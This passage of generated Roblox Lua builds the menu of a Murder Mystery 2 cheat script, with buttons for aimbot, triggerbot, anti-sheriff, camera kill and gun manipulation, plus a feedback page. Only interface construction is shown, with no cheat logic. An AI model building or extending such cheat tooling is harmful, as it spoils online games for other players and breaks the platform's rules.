G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["12a"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["12a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12a"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.spamgun.UIGradient
G2L["12b"] = Instance.new("UIGradient", G2L["129"]);
G2L["12b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.antisherrif
G2L["12c"] = Instance.new("TextButton", G2L["117"]);
G2L["12c"]["TextWrapped"] = true;
G2L["12c"]["TextStrokeTransparency"] = 0;
G2L["12c"]["BorderSizePixel"] = 0;
G2L["12c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12c"]["TextSize"] = 20;
G2L["12c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["12c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["12c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["12c"]["Name"] = [[antisherrif]];
G2L["12c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12c"]["Text"] = [[Anti-Sherrif  ]];
G2L["12c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.antisherrif.Frame
G2L["12d"] = Instance.new("Frame", G2L["12c"]);
G2L["12d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["12d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["12d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.antisherrif.UIGradient
G2L["12e"] = Instance.new("UIGradient", G2L["12c"]);
G2L["12e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.AimBotToMurder
G2L["12f"] = Instance.new("TextButton", G2L["117"]);
G2L["12f"]["TextWrapped"] = true;
G2L["12f"]["TextStrokeTransparency"] = 0;
G2L["12f"]["BorderSizePixel"] = 0;
G2L["12f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["TextSize"] = 20;
G2L["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["12f"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["12f"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["12f"]["Name"] = [[AimBotToMurder]];
G2L["12f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["Text"] = [[Aim-Bot To Murder  ]];
G2L["12f"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.AimBotToMurder.Frame
G2L["130"] = Instance.new("Frame", G2L["12f"]);
G2L["130"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["130"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["130"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["130"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.AimBotToMurder.UIGradient
G2L["131"] = Instance.new("UIGradient", G2L["12f"]);
G2L["131"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.HandlerV4
G2L["132"] = Instance.new("LocalScript", G2L["117"]);
G2L["132"]["Name"] = [[HandlerV4]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["133"] = Instance.new("TextButton", G2L["117"]);
G2L["133"]["TextWrapped"] = true;
G2L["133"]["TextStrokeTransparency"] = 0;
G2L["133"]["BorderSizePixel"] = 0;
G2L["133"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["133"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["133"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["133"]["TextSize"] = 18;
G2L["133"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["133"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["133"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["133"]["Name"] = [[TemplateButton]];
G2L["133"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["133"]["Text"] = [[camera kill Murder - not selected key  ]];
G2L["133"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);
-- Attributes
G2L["133"]:SetAttribute([[SELECTED_KEY]], [[Unknown]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["134"] = Instance.new("UIGradient", G2L["133"]);
G2L["134"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.CKM
G2L["135"] = Instance.new("TextButton", G2L["117"]);
G2L["135"]["TextWrapped"] = true;
G2L["135"]["TextStrokeTransparency"] = 0;
G2L["135"]["BorderSizePixel"] = 0;
G2L["135"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["TextSize"] = 18;
G2L["135"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["135"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["135"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["135"]["Name"] = [[CKM]];
G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Text"] = [[Camera Kill when Pressing key  ]];
G2L["135"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.CKM.Frame
G2L["136"] = Instance.new("Frame", G2L["135"]);
G2L["136"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["136"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["136"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["136"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.CKM.UIGradient
G2L["137"] = Instance.new("UIGradient", G2L["135"]);
G2L["137"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.FastSeparator
G2L["138"] = Instance.new("TextLabel", G2L["117"]);
G2L["138"]["TextWrapped"] = true;
G2L["138"]["BorderSizePixel"] = 0;
G2L["138"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["138"]["TextSize"] = 16;
G2L["138"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["138"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["138"]["Text"] = [[- - -  ]];
G2L["138"]["Name"] = [[FastSeparator]];
G2L["138"]["BackgroundTransparency"] = 1;
G2L["138"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swnm
G2L["139"] = Instance.new("TextButton", G2L["117"]);
G2L["139"]["TextWrapped"] = true;
G2L["139"]["TextStrokeTransparency"] = 0;
G2L["139"]["BorderSizePixel"] = 0;
G2L["139"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["139"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["TextSize"] = 18;
G2L["139"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["139"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["139"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["139"]["Name"] = [[swnm]];
G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["Text"] = [[sound when near Murder  ]];
G2L["139"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swnm.Frame
G2L["13a"] = Instance.new("Frame", G2L["139"]);
G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["13a"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["13a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13a"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swnm.UIGradient
G2L["13b"] = Instance.new("UIGradient", G2L["139"]);
G2L["13b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swmpk
G2L["13c"] = Instance.new("TextButton", G2L["117"]);
G2L["13c"]["TextWrapped"] = true;
G2L["13c"]["TextStrokeTransparency"] = 0;
G2L["13c"]["BorderSizePixel"] = 0;
G2L["13c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["13c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13c"]["TextSize"] = 18;
G2L["13c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["13c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["13c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["13c"]["Name"] = [[swmpk]];
G2L["13c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13c"]["Text"] = [[sound when murder pulls knife  ]];
G2L["13c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swmpk.Frame
G2L["13d"] = Instance.new("Frame", G2L["13c"]);
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["13d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["13d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.swmpk.UIGradient
G2L["13e"] = Instance.new("UIGradient", G2L["13c"]);
G2L["13e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["13f"] = Instance.new("TextButton", G2L["117"]);
G2L["13f"]["TextWrapped"] = true;
G2L["13f"]["TextStrokeTransparency"] = 0;
G2L["13f"]["BorderSizePixel"] = 0;
G2L["13f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["TextSize"] = 20;
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["13f"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["13f"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["13f"]["Name"] = [[TemplateButton]];
G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13f"]["Text"] = [[reset but no one can pick the gun  ]];
G2L["13f"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.1666666716337204, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["140"] = Instance.new("UIGradient", G2L["13f"]);
G2L["140"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.FastSeparator
G2L["141"] = Instance.new("TextLabel", G2L["117"]);
G2L["141"]["TextWrapped"] = true;
G2L["141"]["BorderSizePixel"] = 0;
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["141"]["TextSize"] = 16;
G2L["141"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["141"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["141"]["Text"] = [[- - -  ]];
G2L["141"]["Name"] = [[FastSeparator]];
G2L["141"]["BackgroundTransparency"] = 1;
G2L["141"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["142"] = Instance.new("TextButton", G2L["117"]);
G2L["142"]["TextWrapped"] = true;
G2L["142"]["TextStrokeTransparency"] = 0;
G2L["142"]["BorderSizePixel"] = 0;
G2L["142"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["142"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["142"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["142"]["TextSize"] = 20;
G2L["142"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["142"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["142"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["142"]["Name"] = [[TemplateButton]];
G2L["142"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["142"]["Text"] = [[select a player here...  ]];
G2L["142"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.1666666716337204, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["143"] = Instance.new("UIGradient", G2L["142"]);
G2L["143"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["144"] = Instance.new("TextButton", G2L["117"]);
G2L["144"]["TextWrapped"] = true;
G2L["144"]["TextStrokeTransparency"] = 0;
G2L["144"]["BorderSizePixel"] = 0;
G2L["144"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["144"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["144"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["144"]["TextSize"] = 20;
G2L["144"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["144"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["144"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["144"]["Name"] = [[TemplateButton]];
G2L["144"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["144"]["Text"] = [[give gun to player (KILLS YOU)  ]];
G2L["144"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.1666666716337204, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["145"] = Instance.new("UIGradient", G2L["144"]);
G2L["145"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.FastSeparator
G2L["146"] = Instance.new("TextLabel", G2L["117"]);
G2L["146"]["TextWrapped"] = true;
G2L["146"]["BorderSizePixel"] = 0;
G2L["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["146"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["146"]["TextSize"] = 16;
G2L["146"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["146"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["146"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["146"]["Text"] = [[- - -  ]];
G2L["146"]["Name"] = [[FastSeparator]];
G2L["146"]["BackgroundTransparency"] = 1;
G2L["146"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.lookatmurder
G2L["147"] = Instance.new("TextButton", G2L["117"]);
G2L["147"]["TextWrapped"] = true;
G2L["147"]["TextStrokeTransparency"] = 0;
G2L["147"]["BorderSizePixel"] = 0;
G2L["147"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["147"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["147"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["147"]["TextSize"] = 18;
G2L["147"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["147"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["147"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["147"]["Name"] = [[lookatmurder]];
G2L["147"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["147"]["Text"] = [[LookAt Murder  ]];
G2L["147"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.lookatmurder.Frame
G2L["148"] = Instance.new("Frame", G2L["147"]);
G2L["148"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["148"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["148"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["148"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.lookatmurder.UIGradient
G2L["149"] = Instance.new("UIGradient", G2L["147"]);
G2L["149"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.triggerbot
G2L["14a"] = Instance.new("TextButton", G2L["117"]);
G2L["14a"]["TextWrapped"] = true;
G2L["14a"]["TextStrokeTransparency"] = 0;
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["TextSize"] = 18;
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["14a"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["14a"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["14a"]["Name"] = [[triggerbot]];
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Text"] = [[TriggerBot Murder [PC-Only]  ]];
G2L["14a"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.triggerbot.Frame
G2L["14b"] = Instance.new("Frame", G2L["14a"]);
G2L["14b"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["14b"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["14b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14b"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.triggerbot.UIGradient
G2L["14c"] = Instance.new("UIGradient", G2L["14a"]);
G2L["14c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback
G2L["14d"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["14d"]["Active"] = true;
G2L["14d"]["BorderSizePixel"] = 0;
G2L["14d"]["CanvasSize"] = UDim2.new(0, 0, 3, 0);
G2L["14d"]["TopImage"] = [[]];
G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14d"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["14d"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["14d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14d"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["14d"]["Visible"] = false;
G2L["14d"]["Name"] = [[ALT_page_feedback]];
G2L["14d"]["BottomImage"] = [[]];
-- Attributes
G2L["14d"]:SetAttribute([[rate]], 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.UIListLayout
G2L["14e"] = Instance.new("UIListLayout", G2L["14d"]);
G2L["14e"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["14e"]["Padding"] = UDim.new(0, 5);
G2L["14e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.Separator
G2L["14f"] = Instance.new("TextLabel", G2L["14d"]);
G2L["14f"]["TextWrapped"] = true;
G2L["14f"]["BorderSizePixel"] = 0;
G2L["14f"]["TextScaled"] = true;
G2L["14f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14f"]["TextSize"] = 16;
G2L["14f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14f"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["14f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14f"]["Text"] = [[This script is dedicated to the entire Murder Mystery 2 exploit community]];
G2L["14f"]["Name"] = [[Separator]];
G2L["14f"]["BackgroundTransparency"] = 1;
G2L["14f"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.Separator
G2L["150"] = Instance.new("TextLabel", G2L["14d"]);
G2L["150"]["TextWrapped"] = true;
G2L["150"]["BorderSizePixel"] = 0;
G2L["150"]["TextScaled"] = true;
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["150"]["TextSize"] = 16;
G2L["150"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["Text"] = [[I hope you find it useful!]];
G2L["150"]["Name"] = [[Separator]];
G2L["150"]["BackgroundTransparency"] = 1;
G2L["150"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.Separator
G2L["151"] = Instance.new("TextLabel", G2L["14d"]);
G2L["151"]["TextWrapped"] = true;
G2L["151"]["BorderSizePixel"] = 0;
G2L["151"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["151"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["151"]["TextSize"] = 16;
G2L["151"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["151"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["151"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["151"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["151"]["Name"] = [[Separator]];
G2L["151"]["BackgroundTransparency"] = 1;
G2L["151"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.FeedBackBOX
G2L["152"] = Instance.new("TextBox", G2L["14d"]);
G2L["152"]["TextSize"] = 20;
G2L["152"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["152"]["TextWrapped"] = true;
G2L["152"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["152"]["BackgroundColor3"] = Color3.fromRGB(112, 112, 112);
G2L["152"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["152"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["152"]["MultiLine"] = true;
G2L["152"]["PlaceholderText"] = [[Put your thoughts, ideas, or whatever you  want here as long as it's related to the script's operation or something else...]];
G2L["152"]["Size"] = UDim2.new(0, 317, 0, 131);
G2L["152"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["152"]["Text"] = [[]];
G2L["152"]["Position"] = UDim2.new(0.08557844907045364, 0, 0.41133004426956177, 0);
G2L["152"]["Name"] = [[FeedBackBOX]];
G2L["152"]["ClearTextOnFocus"] = false;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.Separator
G2L["153"] = Instance.new("TextLabel", G2L["14d"]);
G2L["153"]["TextWrapped"] = true;
G2L["153"]["BorderSizePixel"] = 0;
G2L["153"]["TextScaled"] = true;
G2L["153"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["153"]["TextSize"] = 16;
G2L["153"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["153"]["LayoutOrder"] = 6;
G2L["153"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["153"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["153"]["Text"] = [[Select the boxes to choose the rating you give our script.]];
G2L["153"]["Name"] = [[Separator]];
G2L["153"]["BackgroundTransparency"] = 1;
G2L["153"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame
G2L["154"] = Instance.new("Frame", G2L["14d"]);
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(92, 92, 92);
G2L["154"]["LayoutOrder"] = 6;
G2L["154"]["Size"] = UDim2.new(0, 296, 0, 62);
G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["Position"] = UDim2.new(0.06675749272108078, 0, 0.4956139624118805, 0);
G2L["154"]["Name"] = [[RatingFrame]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.star1
G2L["155"] = Instance.new("TextButton", G2L["154"]);
G2L["155"]["BorderSizePixel"] = 0;
G2L["155"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["155"]["TextSize"] = 14;
